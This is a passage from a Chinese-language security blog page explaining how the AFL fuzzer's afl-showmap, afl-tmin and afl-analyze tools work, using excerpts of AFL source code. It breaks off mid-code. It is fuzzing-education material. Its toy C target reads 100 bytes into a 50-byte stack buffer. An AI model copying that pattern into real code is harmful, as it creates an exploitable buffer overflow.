<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/2/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/[AFL%20IV]%20afl-showmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%5BAFL%20IV%5D%20afl-showmap/" class="post-title-link" itemprop="url">AFL IV - afl-showmap</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:13:00 / Modified: 13:22:05" itemprop="dateCreated datePublished" datetime="2025-04-22T13:13:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-IV-afl-showmap"><a href="#AFL-IV-afl-showmap" class="headerlink" title="[AFL IV] afl-showmap"></a>[AFL IV] afl-showmap</h1><p>This tool displays raw tuple data captured by AFL instrumentation.</p>
<p>afl-showmap这个工具用来打印 一次程序执行过程中 被命中的执行路径</p>
<p>从这个工具中能看出, 执行路径是以什么方式存储的</p>
<h2 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h2><p>还是以统计输入前缀中的‘a’个数为例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/dustball/testafl]</span><br><span class="line">└─<span class="meta"># cat test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">50</span>];</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        len++;</span><br><span class="line">    &#125; <span class="keyword">while</span>(s[len] == <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -O0 -g test.c -o test </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;aaaaaaaabbc&#x27; &gt; in</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-showmap -o trace -- ./test &lt; ./in</span><br></pre></td></tr></table></figure>

<p> afl-showmap的 打印效果 是<code>&lt;路径哈希值:命中次数桶&gt;</code>元组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/dustball/testafl]</span><br><span class="line">└─<span class="meta"># cat trace</span></span><br><span class="line"><span class="number">033209</span>:<span class="number">1</span></span><br><span class="line"><span class="number">040822</span>:<span class="number">1</span></span><br><span class="line"><span class="number">044147</span>:<span class="number">1</span></span><br><span class="line"><span class="number">044520</span>:<span class="number">5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意这里打印的是命中次数<strong>桶</strong>,不是命中次数</p>
<p>044520这条路径命中8,9,…,15次都会打印为5</p>
<p>命中4,5,6,7次会打印4</p>
</blockquote>
<h2 id="🧄法分析"><a href="#🧄法分析" class="headerlink" title="🧄法分析"></a>🧄法分析</h2><p>afl系列工具的老套路, afl-showmap先处理命令行参数, 然后建立共享内存, 然后执行一次程序, 然后就应该打印命中的执行路径了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run_target(use_argv);</span><br><span class="line">tcnt = write_results();</span><br></pre></td></tr></table></figure>

<p>在write_results中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//u8* trace_bits = shmat(shm_id, NULL, 0); 就是共享内存, 用于记录执行路径</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;	<span class="comment">//64K</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!trace_bits[i]) <span class="keyword">continue</span>;	<span class="comment">//trace_bits[i] = 0 则表明: 哈希值为 i 的执行路径 没有被命中过</span></span><br><span class="line">      ret++; </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cmin_mode) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (child_timed_out) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (!caa &amp;&amp; child_crashed != cco) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(f, <span class="string">&quot;%u%u\n&quot;</span>, trace_bits[i], i);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="built_in">fprintf</span>(f, <span class="string">&quot;%06u:%u\n&quot;</span>, i, trace_bits[i]);	<span class="comment">//哈希值为i的执行路径, 被命中次数为trace_bits[i]</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>trace_bits中的值是谁填写的呢?showmap中显然没有写操作.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250301101016960.png" alt="image-20250301101016960"></p>
<p>可以这个trace_bits由afl-showmap创建, 之后afl-showmap对trace_bits只有读操作, 至于如何记录, 这是<strong>目标程序中的afl桩</strong>要干的事情</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//桩干的事情:</span></span><br><span class="line">  current_path = _afl_prev_loc ^ _afl_current_loc;</span><br><span class="line">  _afl_prev_loc = _afl_current_loc;             </span><br><span class="line">  _afl_prev_loc = _afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++trace_bits[current_path];</span><br></pre></td></tr></table></figure>

<p>在目标程序执行完之后, afl-showmap会遍历一遍trace_bits, 进行一个按桶分类</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classify_counts(trace_bits, binary_mode ?</span><br><span class="line">                count_class_binary : count_class_human);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">classify_counts</span><span class="params">(u8* mem, <span class="type">const</span> u8* <span class="built_in">map</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE;	<span class="comment">//从后往前遍历</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (edges_only) &#123;	<span class="comment">//只记录有没有命中, 不统计命中次数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">      <span class="keyword">if</span> (*mem) *mem = <span class="number">1</span>;</span><br><span class="line">      mem++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;	</span><br><span class="line">      *mem = <span class="built_in">map</span>[*mem];	<span class="comment">//将实际的命中次数*mem经过map映射一下</span></span><br><span class="line">      mem++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个桶实际上就是一个映射:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_human[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">3</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">5</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">6</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">7</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">8</span>			<span class="comment">//总共有8种桶, 这个映射也就是将命中次数转化为桶编号</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_binary[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span>		<span class="comment">//总共有8个桶,这个映射也就是将命中次数映射为一个代表命中数字</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>因此经过<code>count_class_human</code>的映射后, 假设某条路径命中次数为7, 那么实际得到的<code>trace_bits</code>值就是4, 意思是落到了第4个桶里</p>
<p>至于为甚么只记录8个桶子, 命中次数最大值是255</p>
<p>这是因为trace_bits以字节为单元, 一个字节代表一个执行路径元组. 一个字节最多就能表示[0,255],再命中一次就会整数上溢, 回绕到0</p>
<p>但是开发者认为可以为了性能牺牲这个准确性, 凑活着用吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/[AFL%20III]AFL-tmin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%5BAFL%20III%5DAFL-tmin/" class="post-title-link" itemprop="url">AFL III - AFL-tmin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:11:01 / Modified: 13:22:24" itemprop="dateCreated datePublished" datetime="2025-04-22T13:11:01+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-III-AFL-tmin"><a href="#AFL-III-AFL-tmin" class="headerlink" title="[AFL III]AFL-tmin"></a>[AFL III]AFL-tmin</h1><h2 id="dry-run"><a href="#dry-run" class="headerlink" title="dry_run"></a>dry_run</h2><p>在正式开始最小化输入时, afl-tmin会先尝试执行一下目标程序</p>
<p>如果能够造成崩溃, 并且命令行参数上有-x 崩溃指导模式, 则设定工作在崩溃指导模式</p>
<p>否则设定为执行路径指导模式</p>
<h2 id="minimize"><a href="#minimize" class="headerlink" title="minimize"></a>minimize</h2><p>最小化过程中有四个操作</p>
<p>BLOCK NORMALIZATION</p>
<p>BLOCK DELETION</p>
<p>ALPHABET MINIMIZATION</p>
<p>CHARACTER MINIMIZATION</p>
<h3 id="NORMALIZATION"><a href="#NORMALIZATION" class="headerlink" title="NORMALIZATION"></a>NORMALIZATION</h3><p>“块标准化”,尝试将输入以块为单位置‘0’,此举意在排除输入中的非‘0’字符对执行路径造成影响</p>
<blockquote>
<p>注意不是置NULL,是字符‘0’,ascii值为0x30</p>
<p>因为 字符串处理函数 在面对NULL时的行为 和面对其他字符时的行为 不太一样</p>
</blockquote>
<p>以输入4000个字节为例, 此时有: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">in_data = char[4000];</span><br><span class="line">in_len = 4000;</span><br><span class="line">set_len = next_p2(4000/128) = 32</span><br><span class="line">set_pos = 0</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250228201459202.png" alt="image-20250228201459202"></p>
<p>如果此次块标准化之后的输入不影响程序执行路径.</p>
<p>那么,这块就可以标准化</p>
<p>否则,快给我摆回来</p>
<p>接下来就顺次调整<code>set_pos</code>看下一个块能不能标准化</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250228202426295.png" alt="image-20250228202426295"></p>
<h3 id="BLOCK-DELETION"><a href="#BLOCK-DELETION" class="headerlink" title="BLOCK DELETION"></a>BLOCK DELETION</h3><p>本操作旨在以块删除方式缩减输入</p>
<p>每轮设定一个步长,步长作为块单位,每删一块把剩下的拼起来作为输入,如果不影响执行路径则可以删去,否则给我摆回来</p>
<p>一轮结束后步长减半,重复上述流程,</p>
<p>最后步长为1时,如果一轮结束没有任何新的改动说明收敛了.结束流程.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250228210241092.png"></p>
<h3 id="ALPHABET-MINIMIZATION"><a href="#ALPHABET-MINIMIZATION" class="headerlink" title="ALPHABET MINIMIZATION"></a>ALPHABET MINIMIZATION</h3><p>本操作旨在减少输入中的符号种类</p>
<p>遍历256个ASCII字符, 每次选定一个字符, 将BLOCK DELETION的结果中的所有该字符置‘0’,然后作为输入,如果不影响执行路径,则该字符可以删除</p>
<p>比如选定A字符, 将输入中的所有A替换为‘0’, 然后执行程序, 如果执行路径没变化, 则所有的A都是可以替代的</p>
<h3 id="CHARACTER-MINIMIZATION"><a href="#CHARACTER-MINIMIZATION" class="headerlink" title="CHARACTER MINIMIZATION"></a>CHARACTER MINIMIZATION</h3><p>ALPHABET MINIMIZATION过程中, 某一个字符是一荣俱荣的,</p>
<p>比如<code>A…A…</code>,如果只有第一个A会影响执行路径, 后面的A不会影响, 但是也因为第一个A而赖活着</p>
<p>那么在本阶段中将杀掉这些滥竽充数的, 逐个字符进行筛查</p>
<p>遍历输入的每个字符, 改成‘0’后执行, 宁可执行一千, 也不放过一个</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/[AFL%20V]%20afl-analyze/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%5BAFL%20V%5D%20afl-analyze/" class="post-title-link" itemprop="url">AFL V - afl-analyze</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:11:00 / Modified: 13:22:38" itemprop="dateCreated datePublished" datetime="2025-04-22T13:11:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-V-afl-analyze"><a href="#AFL-V-afl-analyze" class="headerlink" title="[AFL V] afl-analyze"></a>[AFL V] afl-analyze</h1><p>本工具用于尝试理解输入文件的结构</p>
<h2 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h2><p>假设有这么一种结构:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250301145341103.png" alt="image-20250301145341103"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/dustball/myfile]</span><br><span class="line">└─# xxd dustland</span><br><span class="line">00000000: 6475 7374 3400 0000 6161 6161 6161 6161  dust4...aaaaaaaa</span><br><span class="line">00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa</span><br><span class="line">00000020: 6262 6262 6262 6262 6261 6161 6161 6161  bbbbbbbbbaaaaaaa</span><br><span class="line">00000030: 6161 6162 6162 6162 6162 6161 6c61 6e64  aaababababaaland</span><br><span class="line">00000040: 3f14 1d10                                ?...</span><br></pre></td></tr></table></figure>

<p>该结构前后有两个元数据块, 中间是数据块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//format_dstb.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORMAT_DSTB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_DSTB_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSTB_HEADER_MAGIC 0x74737564 <span class="comment">//&quot;dust&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSTB_FOOTER_MAGIC 0x646e616c <span class="comment">//&quot;ball&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> magic;</span><br><span class="line">    <span class="type">int</span> data_size;</span><br><span class="line">&#125;DSTB_Header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> magic;</span><br><span class="line">    <span class="type">unsigned</span> check_sum;</span><br><span class="line">&#125;DSTB_Footer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>构造器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//formatter.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> 